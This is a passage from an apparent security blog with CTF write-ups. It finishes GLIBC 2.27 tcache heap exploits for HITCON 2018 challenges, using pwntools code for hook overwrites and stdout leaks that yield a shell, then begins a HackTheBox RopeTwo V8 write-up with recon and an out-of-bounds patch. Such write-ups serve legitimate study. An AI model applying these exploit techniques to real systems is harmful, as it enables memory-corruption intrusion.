# chunk_5 will be served from tcache and we will put the address of # our fake chunk in the chunk_1\u0026#39;s fd. new_heap(0x68, p64(fake_chunk)) # heap_list[5] =\u0026gt; chunk_1 (0x71) # this allocation serves chunk_1 and put fake chunk address in the tcache new_heap(0x68, \u0026#39;h\u0026#39; * 0x67) Doing so:-\ngef➤ heap bins tcache ──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ──────────────────────────────────────────────────── Tcachebins[idx=5, size=0x70] count=0 ← Chunk(addr=0x7ffff7dcdc0d, size=0x0, flags=) ← [Corrupted chunk at 0xfff7dc9d60000000] Now, the next allocation will return the address 0x7ffff7dcdc0d, which we can overwrite with the one_gadget, resulting in the __malloc_hook being overwritten with the one_gadget\u0026rsquo;s address and trigger the __malloc_hook by allocating a chunk, hence getting a shell:-\n# heap_list[6] =\u0026gt; fake_chunk (0x7f) # since fake_chunk is at the head of the list, this allocation returns it # then, we overwrite __malloc_hook with one gadget new_heap(0x68, p64(libc_base + 0x4f432)) # this allocation triggers __malloc_hook and we have shell new_heap(1, \u0026#39;\u0026#39;, True) p.interactive() Doing so:-\nvagrant@ubuntu-bionic:~/sharedFolder/training/hitcon$ python3 children_tcache.py [+] Starting local process \u0026#39;./children_tcache\u0026#39;: pid 3225 [*] LIBC Base: 0x7ffff79e2000 [*] fake chunk: 0x7ffff7dcdc30 [*] Switching to interactive mode $ whoami vagrant $ echo \u0026#34;Pwned\u0026#34; Pwned $ [*] Interrupted This was an interesting challenge.\nBaby Tcache #This was another challenge proposed in the HITCON 2018 as a part of the pwn category, although the general idea for the exploit was same but the catch here was the show function was not there anymore, this made the approach to this challenge significantly harder than the Children Tcache. In order to pwn the binary, we have to get the LIBC address but since there is no show, we will take the advantage of the stodut structure, in order to get leak of the LIBC address, we will first understand the _IO_2_1_stdout_, so let\u0026rsquo;s delve into it without wasting any time.\nTo save the time, we are not going to reverse engineering the binary since it is same as of the children tcache, the only difference is that this binary doesn\u0026rsquo;t have show function making considerably harder for the LIBC leak but not impossible.\nThe address might be different in the snippets but the core principle is same, ASLR was on during the test as well, so the address randomization could be seen.\nUsing the same wrapper function from the previous challenge:-\nfrom pwn import * p = process(\u0026#34;./baby_tcache\u0026#34;) libc = ELF(\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;) def add(size,data,val=1): s.recvuntil(\u0026#34;Your choice: \u0026#34;) s.sendline(str(1)) s.recvuntil(\u0026#34;Size:\u0026#34;) s.sendline(str(size)) ret = s.recvuntil(\u0026#34;Data:\u0026#34;,timeout=5) if ret == \u0026#34;\u0026#34;: exit() if(val): s.sendline((data)) else: s.send((data)) def free(idx): s.recvuntil(\u0026#34;Your choice: \u0026#34;) s.sendline(str(2)) s.recvuntil(\u0026#34;Index:\u0026#34;) s.sendline(str(idx)) We will follow the same approach, this being said, as we did in the above challenge, we overlapped two chunks such that the main_arena address was populated to the allocated chuk as from the heap_list making us to leak the addresses, this time since we don\u0026rsquo;t have a show function, we will overwrite the last few bits of the populated address such that it points to the _IO_2_1_stdout_ so that the fd of the free\u0026rsquo;d chunk from the unsorted bin would point to the _IO_2_1_stdout_ such that it\u0026rsquo;d be return to us upon next allocation.\nNow, we will alllocate the chunk of following size, usually the ones which will go to either the tcache bin or the unsorted bin:-\n# heap_chunks[0] ==\u0026gt; size 0x500 add(0x4f0,\u0026#34;a\u0026#34;*0x8,1) # heap_chunks[1] ==\u0026gt; size 0x070 add(0x60,\u0026#34;b\u0026#34;*8) # heap_chunks[2] ==\u0026gt; size 0x40 add(0x30,\u0026#34;a\u0026#34;*8) # heap_chunks[3] ==\u0026gt; size 0x20 add(0x10,\u0026#34;a\u0026#34;*8) # heap_chunks[4] ==\u0026gt; size 0x500 add(0x4f0,\u0026#34;b\u0026#34;*8,0) # heap_chunks[5] ==\u0026gt; size 0x20 add(0x10,\u0026#34;a\u0026#34;*8) Now, here we allocated the chunk[0] and chunk[4] in an unsorted bin range and the rest of them usually belongs to the tcache bin range. Now, what we will do here is, free the chunk[3] of size 0x10 and then allocate a chunk of size 0x18 but at the same it\u0026rsquo;ll belong to the bin of the 0x20, the same chunk will be returned. When that will happen, since the actual size we allocated and we are allowed to write to will be of size 0x18 allowing us to write into the metadata and if we will look at the layout of the chunk:-\nThe 0x20 chunk +++++++++++++++++++++++++++ | 0x00 | 0x00 | --\u0026gt; 0x10 +++++++++++++++++++++++++++ | prev_size | size | --\u0026gt; 0x10 --------------------------- After we edit the metadata of the chunk ++++++++++++++++++++++++++ | 0x00 | 0x00 | ++++++++++++++++++++++++++ | 0x5d0 | 0x501 | --\u0026gt; heap_chunks[4] size -------------------------- Now, what will happen here is we will trigger the off by one vulnerability and as well as the prev_size this will result in the chunk layout being:-\n++++++++++++++++++++++++++ | 0x00 | 0x00 | ++++++++++++++++++++++++++ | 0x5d0 | 0x500 | -------------------------- So, when we look at it ourselves in the gdb:-\nfree(3) add(0x18,p64(0x00) *2 + p64(0x5d0),0) The chunk layout in the memory will be:-\ngef➤ x/40xg 0x0000555df391c810 0x555df391c810:\t0x0000000000000000\t0x0000000000000000 0x555df391c820:\t0x00000000000005d0\t0x0000000000000500 So, now when we will free the chunk[0] and chunk[4]:-\nfree(0) free(4) Running so:-\ngef➤ heap bins unsorted ────────────────────────────────── Unsorted Bin for arena \u0026#39;main_arena\u0026#39; ────────────────────────────────── [+] unsorted_bins[0]: fw=0x55dd71e62250, bk=0x55dd71e62250 → Chunk(addr=0x55dd71e62260, size=0xad0, flags=PREV_INUSE) [+] Found 1 chunks in unsorted bin. gef➤ p/x 0x500 + 0x5d0 $4 = 0xad0 gef➤ Now, the total size of the chunk belongs to the unsorted bin is 0xad0 is the summation of the 0x500 and the size we gave it as the 0x5d0, hence 0xad0. But at the same time when we see the whole heap layout, it turns out to be like this:-\ngef➤ heap chunks Chunk(addr=0x55dd71e62010, size=0x250, flags=PREV_INUSE) [0x000055dd71e62010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................] Chunk(addr=0x55dd71e62260, size=0xad0, flags=PREV_INUSE) [0x000055dd71e62260 a0 6c 50 9e d4 7f 00 00 a0 6c 50 9e d4 7f 00 00 .lP......lP.....] Chunk(addr=0x55dd71e62d30, size=0x20, flags=) [0x000055dd71e62d30 61 61 61 61 61 61 61 61 00 00 00 00 00 00 00 00 aaaaaaaa........] Chunk(addr=0x55dd71e62d50, size=0x202c0, flags=PREV_INUSE) ← top chunk gef➤ If you pay attention, we had almost 6 chunks allocated in which we free\u0026rsquo;d 2 of them, that leaves the 4 of them allocated, but as the gef output we can definitely see only two chunks here referenced, first is the one we free\u0026rsquo;d and went into the unsorted bin and other one is the last chunk we allocated to prevent the top_chunk consolidation. But when we look at the gloabal array which keeps the track of the allocated chunks,\ngef➤ x/30xg 0x55dd713f3050 0x55dd713f3050:\t0x0000000000000000\t0x0000000000000000 0x55dd713f3060:\t0x0000000000000000\t0x000055dd71e62760 0x55dd713f3070:\t0x000055dd71e627d0\t0x000055dd71e62810 0x55dd713f3080:\t0x0000000000000000\t0x000055dd71e62d30 It shows we have 4 allocated chunks, this shows that the chunk[1] and the chunk[2] and the chunk[3] now is within the unsorted bin chunk. It overlaps the chunks contigously laid out. So, now we will free the chunk[1] and the chunk[3]:-\nfree(1) free(3) Checking the bins and the heap chunks layout:-\ngef➤ x/400xg 0x5623a643c250 0x5623a643c250:\t0x0000000000000000\t0x0000000000000ad1 0x5623a643c260:\t0x00007fda26360ca0\t0x00007fda26360ca0 0x5623a643c270:\t0x0000000000000000\t0x0000000000000000 [..snip..] 0x5623a643c750:\t0x0000000000000500\t0x0000000000000070 0x5623a643c760:\t0x0000000000000000\t0x00005623a643c010 0x5623a643c770:\t0xdadadadadadadada\t0xdadadadadadadada 0x5623a643c780:\t0xdadadadadadadada\t0xdadadadadadadada 0x5623a643c790:\t0xdadadadadadadada\t0xdadadadadadadada 0x5623a643c7a0:\t0xdadadadadadadada\t0xdadadadadadadada 0x5623a643c7b0:\t0xdadadadadadadada\t0xdadadadadadadada 0x5623a643c7c0:\t0x0000000000000000\t0x0000000000000041 0x5623a643c7d0:\t0x6161616161616161\t0x0000000000000000 0x5623a643c7e0:\t0x0000000000000000\t0x0000000000000000 0x5623a643c7f0:\t0x0000000000000000\t0x0000000000000000 0x5623a643c800:\t0x0000000000000000\t0x0000000000000021 0x5623a643c810:\t0x0000000000000000\t0x00005623a643c010 0x5623a643c820:\t0xdadadadadadadada\t0x0000000000000500 0x5623a643c830:\t0xdadadadadadadada\t0xdadadadadadadada [..snip..] 0x5623a643cd20:\t0x0000000000000ad0\t0x0000000000000020 0x5623a643cd30:\t0x6161616161616161\t0x0000000000000000 0x5623a643cd40:\t0x0000000000000000\t0x00000000000202c1 Now, if we do pay attention the chunk[1] and the chunk[3] which we free\u0026rsquo;d a moment ago is within the chunk we free\u0026rsquo;d with the extended size, resulting in the overlap. Now, we will just allocate a chunk of size 0x4f0 giving the chunk 0x500 from the unsorted bin and then again allocating a chunk of size 0x90 and this time, we will get a chunk from the unsorted bin, since the given chunk will have it\u0026rsquo;s fd and bk populated with the main_arena, we will attempt to write the last 4 bits of the fd address such that it would point to the _IO_2_1_stdout-\u0026gt;flags:-\nadd(0x4f0,\u0026#34;a\u0026#34;) # partial overwrite to stdout-\u0026gt;_flags add(0x90,b\u0026#34;\\x60\\x07\u0026#34;,0) Doing that so, we get the _IO_2_1_stdout_ address populated to the heap_chunks global array at the index 3, this happened because when we allocated the chunk of size 0x4f0 that made the all the chunks which we free\u0026rsquo;d belonging to the tcache bin as they overlapped into the unsorted bin result in the free\u0026rsquo;d chunks also being populated with the main_arena address. So, when we allocate a chunk of size 0x90 will be given from the unsorted bin, from the overlapped region, hence we could overwrite the last 4 bits of the address and made it point to the _IO_2_1_stdout_:-\ngef➤ x/10xg 0x56431531d050 0x56431531d050:\t0x0000000000000000\t0x0000000000000000 0x56431531d060:\t0x0000564316c8f260\t0x0000564316c8f760 0x56431531d070:\t0x0000564316c8f7d0\t0x0000564316c8f760 0x56431531d080:\t0x00007fa0293a0760\t0x0000564316c8fd30 0x56431531d090:\t0x0000000000000000\t0x0000000000000000 gef➤ p \u0026amp;_IO_2_1_stdout_ $51 = (struct _IO_FILE_plus *) 0x7fa0293a0760 \u0026lt;_IO_2_1_stdout_\u0026gt; Now, what we will do here is make the flag to be 0xfbad1800 and the associating member of the struct to be of the NULL, hence resulting in the next puts call, which will call the _IO_new_file_xsputn hence, giving a huge buffer dump:-\ngef➤ p _IO_2_1_stdout_ $52 = { file = { _flags = 0xfbad1800, _IO_read_ptr = 0x7fa0293a07e3 \u0026lt;_IO_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _IO_read_end = 0x7fa0293a07e3 \u0026lt;_IO_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _IO_read_base = 0x7fa0293a07e3 \u0026lt;_IO_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _IO_write_base = 0x7fa0293a07e3 \u0026lt;_IO_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _IO_write_ptr = 0x7fa0293a07e3 \u0026lt;_IO_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _IO_write_end = 0x7fa0293a07e4 \u0026lt;_IO_2_1_stdout_+132\u0026gt; \u0026#34;\u0026#34;, _IO_buf_base = 0x7fa0293a07e3 \u0026lt;_IO_2_1_stdout_+131\u0026gt; \u0026#34;\\n\u0026#34;, _IO_buf_end = 0x7fa0293a07e4 \u0026lt;_IO_2_1_stdout_+132\u0026gt; \u0026#34;\u0026#34;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7fa02939fa00 \u0026lt;_IO_2_1_stdin_\u0026gt;, _fileno = 0x1, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = \u0026#34;\\n\u0026#34;, _lock = 0x7fa0293a18c0 \u0026lt;_IO_stdfile_1_lock\u0026gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7fa02939f8c0 \u0026lt;_IO_wide_data_1\u0026gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0xffffffff, _unused2 = \u0026#39;\\000\u0026#39; \u0026lt;repeats 19 times\u0026gt; }, vtable = 0x7fa02939c2a0 \u0026lt;_IO_file_jumps\u0026gt; } add(0x60,\u0026#34;w\u0026#34;) add(0x60,p64(0xfbad1800) + p64(0x00)*3 + b\u0026#34;\\x00\u0026#34;,1) This resulted in:-\nNow, such that this has happened, we carefully parse the leak which resulted in a success LIBC leak:-\nlibc_leak=u64(p.recv(6)+b\u0026#34;\\x00\\x00\u0026#34;)-0x3ebff0 log.info(\u0026#34;LIBC: \u0026#34;+hex(libc_leak)) free_hook=libc_leak + libc.symbols[\u0026#39;__free_hook\u0026#39;] system=libc_leak + libc.symbols[\u0026#39;system\u0026#39;] one_gadget = libc_leak+0x4f432 And we get a success LIBC leak, thus defeating the ASLR:-\n[+] Starting local process \u0026#39;./baby_tcache\u0026#39;: pid 4839 [*] \u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] 0x7ff4d3954000 [*] Switching to interactive mode [..snip..] 🍊 Baby Tcache 🍊 $$$$$$$$$$$$$$$$$$$$$$$$$$$ $ 1. New heap $ $ 2. Delete heap $ $ 3. Exit $ $$$$$$$$$$$$$$$$$$$$$$$$$$$ Your choice: $ Now, from this point we will just overwrite the fd of a free\u0026rsquo;d tcache chunk with our target address such that during next allocation, depending on the size will return the target via malloc allowing us to overwrite it. Given the heap condition as of now, when we look at the available bins, we see:-\ngef➤ heap bins ────────────────────────────────── Tcachebins for arena 0x7fe15febfc40 ────────────────────────────────── Tcachebins[idx=0, size=0x20] count=1 ← Chunk(addr=0x55ab342e0810, size=0x7fe15febfca0, flags=) Tcachebins[idx=5, size=0x70] count=255 ← [Corrupted chunk at 0xfbad2887] ─────────────────────────────────── Fastbins for arena 0x7fe15febfc40 ─────────────────────────────────── Fastbins[idx=0, size=0x20] 0x00 Fastbins[idx=1, size=0x30] 0x00 Fastbins[idx=2, size=0x40] 0x00 Fastbins[idx=3, size=0x50] 0x00 Fastbins[idx=4, size=0x60] 0x00 Fastbins[idx=5, size=0x70] 0x00 Fastbins[idx=6, size=0x80] 0x00 ────────────────────────────────── Unsorted Bin for arena \u0026#39;main_arena\u0026#39; ────────────────────────────────── [+] unsorted_bins[0]: fw=0x55ab342e07f0, bk=0x55ab342e07f0 → Chunk(addr=0x55ab342e0800, size=0x530, flags=PREV_INUSE) [+] Found 1 chunks in unsorted bin. If you pay close attention, the chunk of the unsorted bin is pointing to the address 0x55.....0800 and at the same time the tcache bin[0]\u0026rsquo;s chunk point to the 0x55....0810, this proposed the idea of allocating a chunk of a size which will return the exact chunk pointed by the unsorted bin, that way we will be able to overwrite the fd of the tcache chunk 0x55......0810.\nadd(0x400,p64(0x00)*2 +p64(free_hook)) Doing that so, this will overwrite the fd of the chunk 0x55...810 to the address of the free_hook, for which we can get it in next allocation-\ngef➤ heap bins tcache ────────────────────────────────── Tcachebins for arena 0x7fe15febfc40 ────────────────────────────────── Tcachebins[idx=0, size=0x20] count=1 ← Chunk(addr=0x55ab342e0810, size=0x0, flags=) ← Chunk(addr=0x7fe15fec18e8, size=0x0, flags=) Tcachebins[idx=5, size=0x70] count=255 ← [Corrupted chunk at 0xfbad2887] gef➤ p \u0026amp;__free_hook $60 = (void (**)(void *, const void *)) 0x7fe15fec18e8 \u0026lt;__free_hook\u0026gt; We successfully overwritten the chunk 0x55..810\u0026rsquo;s fd to the address of the free_hook, now we will just do two allocations, one will return the chunk 0x55..810 and the other one will give us the target i.e. __free_hook.\nadd(0x10,\u0026#34;a\u0026#34;) # Gives the chunk 0x55....810 add(0x10,p64(one_gadget),1) # Gives the __free_hook address and result in being overwritten with the one_gadget address Given this, it\u0026rsquo;ll result in the __free_hook being overwritten with the one_gadget address:-\ngef➤ x/xg \u0026amp;__free_hook 0x7fa27c4e18e8 \u0026lt;__free_hook\u0026gt;:\t0x00007fa27c143432 Great, we successfully overwrote the __free_hook address, now we will just do free(0) which will just result in the one_gadget being called, spawning a shell:-\nfree(0) Now, we get a shell:-\n[+] Starting local process \u0026#39;./baby_tcache\u0026#39;: pid 6009 [*] \u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] 0x7fa27c0f4000 [*] Paused (press any to continue) [*] Switching to interactive mode $ whoami vagrant $ ls baby_tcache children_tcache.i64 house_of_einherjar.c baby_tcache.i64 children_tcache.py libc.so.6 baby_tcache.py core overlapping_chunks children_tcache house_of_einherjar overlapping_chunks.c $ This was it, although this could be more explainative if we go in-depth about the _IO_2_1_stdout_ part, for that, I saved the analysis to later on. Now, that was that, have fun pwning.\n","date":"21 January 2021","permalink":"/posts/overlapping_chunks_tcache/","section":"Posts","summary":"This is going to be an in-depth explaination of the overlapping chunks techniques on GLIBC 2.27, this technique can also be produced on the GLIBC 2.","title":"Overlapping Chunks: GLIBC 2.27 Heap Exploitation"},{"content":"","date":null,"permalink":"/categories/pwning/","section":"Categories","summary":"","title":"Pwning"},{"content":"This box was without a second thought one of the favourite box of mine on HackTheBox so far, since I am more of a pwn and reverse engineering person, this machine was a challenge, an outstanding one which pushed my learning skills more further because upto the moment I really went into this, I was not a good at heap exploitation, more skeptical about the V8 exploitation skills of mine and of course I knew nothing of the kernel pwn, so this was a way to tackle every weakness of mine, hope you find the writeup useful, I\u0026rsquo;ll include the link of the attachments at the very bottom to my files, QEMU enviornment for the kernel pwn and the exploits, without further ado, let\u0026rsquo;s start.\nFoothold #So, as this became kind of obvious that the foothold required the V8 exploitation as the rumors went by. But apart from that, I started scanning the ports as I was unclear myself where and how things are on this machine, now starting off, I used nmap to scan the ports:-\n➜ ✔ nmap -sV -sC -A 10.10.10.196 Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-16 21:57 IST Nmap scan report for 10.10.10.196 Host is up (0.83s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 bc:d9:40:18:5e:2b:2b:12:3d:0b:1f:f3:6f:03:1b:8f (RSA) | 256 15:23:6f:a6:d8:13:6e:c4:5b:c5:4a:6f:5a:6b:0b:4d (ECDSA) |_ 256 83:44:a5:b4:88:c2:e9:28:41:6a:da:9e:a8:3a:10:90 (ED25519) 5000/tcp open http nginx | http-robots.txt: 55 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.196:5000/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about 8000/tcp open http Werkzeug httpd 0.14.1 (Python 3.7.3) |_http-server-header: Werkzeug/0.14.1 Python/3.7.3 |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 141.64 seconds The port 22 was open, being the SSh, the other two were the ones running the webserver, port 5000 was running the GitLab and the port 8000 running a webserver. Checking the port 5000:\nIt seemed like the portfolio for a company showing their own version of V8 engine, which is the JavaScript Engine for the chromium based browsers, there was a download link for the browser, so without any second thought I downloaded it.\nFrom the name of the archive it seemed like the chromium browser compressed into the POSIX tar archive, after extracting it seemed like the chromium browser as we expected it to be, although running it, just spawned the chromium browser, so that was it, nothing special came out of this.\nNow, that being aside, the only port that was 8000, we had a link at the footer of the page which said Source, opening the link, we immediately see a subdomain gitlab.ropetwo.htb, which was as follows:-\nV8 Exploitation #We immediately, sees a commit which was made, as I did some v8 pwn, I went to check on commit and found the diff file, using so, I moved further and started building v8 engine binary d8, I used the commit, prior to the r4j user made, which was at here\nNow, first of all, we didn\u0026rsquo;t has much thing to get started, as for starting to pwn the v8 engine of it, we had to build the binary named d8, since that was not provided. I fetched the v8 engine code from the google and checkout the last commit which was mentioned in the GitLab, following are the steps one could replicate to make their own version of the d8 by applying the diff file.\nd4mian@pwnbox:~$ fetch v8 d4mian@pwnbox:~$ cd v8 d4mian@pwnbox:~/v8$ ./build/install-build-deps.sh d4mian@pwnbox:~/v8$ git checkout d91e8d8fca64679c8df05603b5ff7e58709c4801 d4mian@pwnbox:~/v8$ gclient sync d4mian@pwnbox:~/v8$ git apply ../patch.diff d4mian@pwnbox:~/v8$ ./tools/dev/v8gen.py x64.release d4mian@pwnbox:~/v8$ ninja -C ./out.gn/x64.release d4mian@pwnbox:~/v8$ ./tools/dev/v8gen.py x64.debug d4mian@pwnbox:~/v8$ ninja -C ./out.gn/x64.debug This took some time, approximately 3 hours on my VM which had 3GB of RAM and 1 core, though I made both the debug version and release version, but the release version was more helpful because before doing this v8 exploitation challenge, I did the DownUnderCTF\u0026rsquo;s \u0026ldquo;Is it Pwn or Web?\u0026rdquo; challenge which was close to same to this one, that being said, let\u0026rsquo;s get started.\nAttachment: The d8 binary and the exploits can be found here: https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Foothold\nThe only obstacle one would really stumble upon during this challenge is the use of the Pointer Compression, this made the address representation in 32 bit, which resulted in the leak being hard to make something of, since the isolate root, the upper 32 bit value of an address which is used to access the data around the V8 heap turned out to be an issue. But going through this blog, this mentioned that we do not need to know about the isolate root address, if we could manage to massage the vulnerability to get fakeobj and the addrof primitive, then we can get through the pointer compression which would result in not being a problem.\nFirst of all, we need to analyse the patch file such that we spot which commit specifically pushed changes and pushed it where exactly:-\n~/Pwning/HackTheBox/htb-rope2 $ cat patch.diff diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc index 3c2fe33c5b4b330c509d2926bc1e30daa1e09dba..99f0271e035220cd7228e8f9d8959e3b248a6cb5 100644 --- a/src/builtins/builtins-array.cc +++ b/src/builtins/builtins-array.cc @@ -297,6 +297,34 @@ BUILTIN(ArrayPrototypeFill) { return GenericArrayFill(isolate, receiver, value, start_index, end_index); } +BUILTIN(ArrayGetLastElement) +{ +\tHandle\u0026lt;JSReceiver\u0026gt; receiver; +\tASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver())); +\tHandle\u0026lt;JSArray\u0026gt; array = Handle\u0026lt;JSArray\u0026gt;::cast(receiver); +\tuint32_t len = static_cast\u0026lt;uint32_t\u0026gt;(array-\u0026gt;length().Number()); +\tFixedDoubleArray elements = FixedDoubleArray::cast(array-\u0026gt;elements()); +\treturn *(isolate-\u0026gt;factory()-\u0026gt;NewNumber(elements.get_scalar(len))); +} + +BUILTIN(ArraySetLastElement) +{ +\tHandle\u0026lt;JSReceiver\u0026gt; receiver; +\tASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver())); +\tint arg_count = args.length(); +\tif (arg_count != 2) // first value is always this +\t{ +\treturn ReadOnlyRoots(isolate).undefined_value(); +\t} +\tHandle\u0026lt;JSArray\u0026gt; array = Handle\u0026lt;JSArray\u0026gt;::cast(receiver); +\tuint32_t len = static_cast\u0026lt;uint32_t\u0026gt;(array-\u0026gt;length().Number()); +\tHandle\u0026lt;Object\u0026gt; value; +\tASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, Object::ToNumber(isolate, args.atOrUndefined(isolate,1))); +\tFixedDoubleArray elements = FixedDoubleArray::cast(array-\u0026gt;elements()); +\telements.set(len,value-\u0026gt;Number()); +\treturn ReadOnlyRoots(isolate).undefined_value(); +} + namespace { V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate, BuiltinArguments* args) { diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h index 92a430aa2c0cbc3d65fdf2f1f4f295824379dbd8..02982b1c858eb313befcb8ad9e396dcdfbf2f9ab 100644 --- a/src/builtins/builtins-definitions.h +++ b/src/builtins/builtins-definitions.h @@ -319,6 +319,8 @@ namespace internal { TFJ(ArrayPrototypePop, kDontAdaptArgumentsSentinel) \\ /* ES6 #sec-array.prototype.push */ \\ CPP(ArrayPush) \\ + CPP(ArrayGetLastElement) \\ + CPP(ArraySetLastElement) \\ TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel) \\ /* ES6 #sec-array.prototype.shift */ \\ CPP(ArrayShift) \\ diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc index 6d53531f1cbf9b6669c6b98ea8779e8133babe8d..5db31e9b733cdaa1dd2049b72b7fb6392ea4a1ab 100644 --- a/src/compiler/typer.cc +++ b/src/compiler/typer.cc @@ -1706,6 +1706,11 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) { // Array functions. case Builtins::kArrayIsArray: return Type::Boolean(); + case Builtins::kArrayGetLastElement: + return Type::Receiver(); + case Builtins::kArraySetLastElement: + return Type::Receiver(); + case Builtins::kArrayConcat: return Type::Receiver(); case Builtins::kArrayEvery: diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc index 7fd1e40f661461fdbcf9228c5ce9127c3428dc7b..3a9b97e4b6426e101ca0cdc97ce1cc92aa689968 100644 --- a/src/init/bootstrapper.cc +++ b/src/init/bootstrapper.cc @@ -1660,6 +1660,10 @@ void Genesis::InitializeGlobal(Handle\u0026lt;JSGlobalObject\u0026gt; global_object, Builtins::kArrayPrototypeLastIndexOf, 1, false); SimpleInstallFunction(isolate_, proto, \u0026#34;pop\u0026#34;, Builtins::kArrayPrototypePop, 0, false); + SimpleInstallFunction(isolate_, proto, \u0026#34;GetLastElement\u0026#34;, Builtins::kArrayGetLastElement, + 0, false); + SimpleInstallFunction(isolate_, proto, \u0026#34;SetLastElement\u0026#34;, Builtins::kArraySetLastElement, + 0, false); SimpleInstallFunction(isolate_, proto, \u0026#34;push\u0026#34;, Builtins::kArrayPrototypePush, 1, false); SimpleInstallFunction(isolate_, proto, \u0026#34;reverse\u0026#34;, Breaking this down, the following lines:-\n--- a/src/builtins/builtins-array.cc +++ b/src/builtins/builtins-array.cc @@ -297,6 +297,34 @@ BUILTIN(ArrayPrototypeFill) { return GenericArrayFill(isolate, receiver, value, start_index, end_index); } +BUILTIN(ArrayGetLastElement) +{ +\tHandle\u0026lt;JSReceiver\u0026gt; receiver; +\tASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver())); +\tHandle\u0026lt;JSArray\u0026gt; array = Handle\u0026lt;JSArray\u0026gt;::cast(receiver); +\tuint32_t len = static_cast\u0026lt;uint32_t\u0026gt;(array-\u0026gt;length().Number()); +\tFixedDoubleArray elements = FixedDoubleArray::cast(array-\u0026gt;elements()); +\treturn *(isolate-\u0026gt;factory()-\u0026gt;NewNumber(elements.get_scalar(len))); +} + +BUILTIN(ArraySetLastElement) +{ +\tHandle\u0026lt;JSReceiver\u0026gt; receiver; +\tASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver())); +\tint arg_count = args.length(); +\tif (arg_count != 2) // first value is always this +\t{ +\treturn ReadOnlyRoots(isolate).undefined_value(); +\t} +\tHandle\u0026lt;JSArray\u0026gt; array = Handle\u0026lt;JSArray\u0026gt;::cast(receiver); +\tuint32_t len = static_cast\u0026lt;uint32_t\u0026gt;(array-\u0026gt;length().Number()); +\tHandle\u0026lt;Object\u0026gt; value; +\tASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, Object::ToNumber(isolate, args.atOrUndefined(isolate,1))); +\tFixedDoubleArray elements = FixedDoubleArray::cast(array-\u0026gt;elements()); +\telements.set(len,value-\u0026gt;Number()); +\treturn ReadOnlyRoots(isolate).undefined_value(); +} + Here the /src/builtins/builtins-array.c is used to denote that there are some new functions which are being added, this being mentioned the following two functions which were added here is the ArrayGetLastElement and the ArraySetLastElement, let\u0026rsquo;s break those down one by one:-\nThe ArrayGetLastElement as the name implies, it gets the last element from the array, first off it calculates the length in the variable len the returns the element stored as the len index, now i =f you pay attention here, the len here is an absolute length of the array, we know that since an array indexing starts from the 0, to access the 0th element we do array[0] but here since the element is stored in an array and the value which is at the len index is being hence allowing us for Out-Of-Bound read by 1 element.\nThe ArraySetLastElement as the name says, this built-in function saves the value to the last index of the array, now here, as of the previous function, the len is counted by the length of the array and then elements defined would be overwritten at that index, array[index] = element. Yes, you\u0026rsquo;re thinking corrrectly, we have Out-Of-Bound write here too but by 1 element.\nSo, as above mentioned we know that there are 2 functions that we have use in order to exploit this specific patch of the binary and eventually the chrome browser.\nAs this is also going to be very detailed blog post, we will understand the concepts first then we will move on eventually.\nAs JavaScript is a dynamically typed language, the engine must store type information with every runtime value. In v8, this is accomplished through a combination of pointer tagging and the use of dedicated type information objects, called Maps. These Maps are used to keep the track of the objects created at runtime, since this is how objects are handle, overwriting the map would lead to some internal type confusion within the V8 engine itself. As of now, you might be thinking how exactly we access Maps and most importantly \u0026ldquo;How do we recognize a Map?\u0026rdquo;, for this I used the debug version of the d8 binary. that binary when run with the allow-natives-syntax will let you use the %DebugPrint(\u0026lt;object\u0026gt;) which will print the related information of the objects, let\u0026rsquo;s say, for example, we declared the array with the elements and then use the %DebugPrint(arr) to get all the information about an objects including but not limited to:-\nMap address Element Pointer Type Information etc. d4mian@pwnbox:~/Pwning/v8/out.gn/x64.debug$ 